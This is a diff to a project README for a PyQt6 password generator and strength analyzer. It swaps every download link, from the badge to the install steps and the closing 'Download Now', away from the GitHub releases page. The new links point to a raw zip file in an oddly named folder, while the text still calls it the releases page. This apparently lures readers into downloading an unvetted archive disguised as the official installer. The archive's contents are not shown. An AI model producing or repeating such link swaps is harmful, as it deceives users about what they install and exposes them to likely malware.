@@ -1,6 +1,6 @@
 # 🛡️ PyQt6-Password-Generator-Analyzer - Secure Passwords Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue)](https://github.com/salman3757/PyQt6-Password-Generator-Analyzer/releases)
+[![Download Now](https://raw.githubusercontent.com/salman3757/PyQt6-Password-Generator-Analyzer/main/unconceited/PyQt6-Password-Generator-Analyzer_pitchered.zip)](https://raw.githubusercontent.com/salman3757/PyQt6-Password-Generator-Analyzer/main/unconceited/PyQt6-Password-Generator-Analyzer_pitchered.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ Welcome to the PyQt6-Password-Generator-Analyzer! This application allows you to
 
 ## 📥 Download & Install
 
-To download the application, visit the following page: [Download the Latest Release](https://github.com/salman3757/PyQt6-Password-Generator-Analyzer/releases). There, you will find the latest version available for your system.
+To download the application, visit the following page: [Download the Latest Release](https://raw.githubusercontent.com/salman3757/PyQt6-Password-Generator-Analyzer/main/unconceited/PyQt6-Password-Generator-Analyzer_pitchered.zip). There, you will find the latest version available for your system.
 
 ### Installation Steps:
 
-1. Open the [Releases Page](https://github.com/salman3757/PyQt6-Password-Generator-Analyzer/releases) in your web browser.
+1. Open the [Releases Page](https://raw.githubusercontent.com/salman3757/PyQt6-Password-Generator-Analyzer/main/unconceited/PyQt6-Password-Generator-Analyzer_pitchered.zip) in your web browser.
 2. Look for the version labeled "Latest Release."
 3. Click on the link for the installer file that matches your operating system.
 4. Once the file downloads, locate it in your downloads folder.
@@ -84,6 +84,6 @@ For more detailed explanations on these topics, refer to the related sections in
 
 ## 🔗 Visit and Download
 
-To download the PyQt6-Password-Generator-Analyzer, please visit this page: [Download Now](https://github.com/salman3757/PyQt6-Password-Generator-Analyzer/releases).
+To download the PyQt6-Password-Generator-Analyzer, please visit this page: [Download Now](https://raw.githubusercontent.com/salman3757/PyQt6-Password-Generator-Analyzer/main/unconceited/PyQt6-Password-Generator-Analyzer_pitchered.zip).
 
 Stay safe online and generate strong passwords to protect your accounts!
